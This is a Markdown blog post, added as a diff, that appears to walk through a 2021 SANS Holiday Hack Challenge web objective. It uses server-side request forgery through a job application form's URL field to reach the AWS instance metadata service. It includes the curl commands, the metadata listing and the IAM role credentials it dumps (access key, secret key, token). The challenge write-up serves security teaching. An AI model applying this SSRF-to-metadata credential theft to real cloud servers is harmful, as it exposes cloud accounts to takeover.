@@ -1,0 +1,125 @@
+---
+title:  "Objective 10: Now Hiring! - 2021 SANS Holiday Hack Challenge"
+date:   "2022-01-05 00:010:00 -0800"
+categories: HolidayHack2021
+header:
+ teaser: /assets/images/HolidayHack2021/application_submitted.png
+---
+
+This will be some more web app pen testing, this time on a job portal.
+
+[Play the 2021 SANS Holiday Hack Challenge](https://2021.kringlecon.com/invite)
+
+## Objective
+>What is the secret access key for the [Jack Frost Tower job applications server](https://apply.jackfrosttower.com/)?
+
+## Hint
+- The [AWS documentation for IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) is interesting reading.
+- 
+## Enumeration
+Going to [https://apply.jackfrosttower.com/](https://apply.jackfrosttower.com/) takes us to a job portal for Jack Frost's corporation. There are a few obvious pages:
+- The home page: [https://apply.jackfrosttower.com/](https://apply.jackfrosttower.com/)
+- Opportunties page: [https://apply.jackfrosttower.com/?p=opportunities](https://apply.jackfrosttower.com/?p=opportunities)
+- Application form: [https://apply.jackfrosttower.com/?p=apply](https://apply.jackfrosttower.com/?p=apply)
+- About page:  [https://apply.jackfrosttower.com/?p=about](https://apply.jackfrosttower.com/?p=about)
+
+The page that seems the most interesting is the [application form](https://apply.jackfrosttower.com/?p=opportunities). There a a few interesting fields in this form that seem like the best avenues for exploitation, specifically the "Resume" upload and "URL to your public NLBI report" fileds. If we upload a resume that's actually an executable, would it be automatically ran? My guess is probably not. The site might be built to automatically check the NLBI report link though, in which case we could have the server check URLs for us and hopefully report back the results.
+
+Let's try filling in the form and seeing what happens. Taking the hint from the IMDS Exploration challenge, let's put in `http://169.254.169.254/latest/meta-data/` as the NLBI URL.
+
+This returns us a page that looks like this:
+
+![Application Submitted Page](/assets/images/HolidayHack2021/application_submitted.png)
+
+I wonder if that broken image has anything interesting in it. Let's right-click the page and select view source. We can see that the image source is `images/First Last.jpg` (I entered my name as "First Last" in the form), so it was dynamically created based on our submission. Going to [https://apply.jackfrosttower.com/images/First%20Last.jpg](https://apply.jackfrosttower.com/images/First%20Last.jpg) returns a page, but Firefox tells me that the image can't be displayed because there are errors. Let's try to curl it instead to get the raw data:
+
+```bash
+curl https://apply.jackfrosttower.com/images/First%20Last.jpg
+```
+
+output:
+```
+ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/ami
+block-device-mapping/ebs0
+block-device-mapping/ephemeral0
+block-device-mapping/root
+block-device-mapping/swap
+elastic-inference/associations
+elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1
+events/maintenance/scheduled
+events/recommendations/rebalance
+hostname
+iam/info
+iam/security-credentials
+iam/security-credentials/jf-deploy-role
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+latest
+latest/api/token
+local-hostname
+local-ipv4
+mac
+network/interfaces/macs/0e:49:61:0f:c3:11/device-number
+network/interfaces/macs/0e:49:61:0f:c3:11/interface-id
+network/interfaces/macs/0e:49:61:0f:c3:11/ipv4-associations/192.0.2.54
+network/interfaces/macs/0e:49:61:0f:c3:11/ipv6s
+network/interfaces/macs/0e:49:61:0f:c3:11/local-hostname
+network/interfaces/macs/0e:49:61:0f:c3:11/local-ipv4s
+network/interfaces/macs/0e:49:61:0f:c3:11/mac
+network/interfaces/macs/0e:49:61:0f:c3:11/owner-id
+network/interfaces/macs/0e:49:61:0f:c3:11/public-hostname
+network/interfaces/macs/0e:49:61:0f:c3:11/public-ipv4s
+network/interfaces/macs/0e:49:61:0f:c3:11/security-group-ids
+network/interfaces/macs/0e:49:61:0f:c3:11/security-groups
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-id
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv4-cidr-block
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv6-cidr-blocks
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-id
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-block
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-blocks
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv6-cidr-blocks
+placement/availability-zone
+placement/availability-zone-id
+placement/group-name
+placement/host-id
+placement/partition-number
+placement/region
+product-codes
+public-hostname
+public-ipv4
+public-keys/0/openssh-key
+reservation-id
+security-groups
+services/domain
+services/partition
+spot/instance-action
+spot/termination-time
+```
+
+And that's the response from `http://169.254.169.254/latest/meta-data/`! Great! Now all we have to do is figure out how to get the "secret access key", which is part of AWS' IAM roles. Looking through the list above, `iam/security-credentials/jf-deploy-role` seems like the place to go.
+
+Easy enough, just resubmit the application with `http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role` as the URL instead (keeping the name the same in the form if you want to use the same curl command), then curl the "image" again:
+```bash
+curl https://apply.jackfrosttower.com/images/First%20Last.jpg
+```
+
+We get this in response:
+
+```json
+{
+        "Code": "Success",
+        "LastUpdated": "2021-05-02T18:50:40Z",
+        "Type": "AWS-HMAC",
+        "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+        "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+        "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+        "Expiration": "2026-05-02T18:50:40Z"
+}
+```
+
+**Answer:** CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX
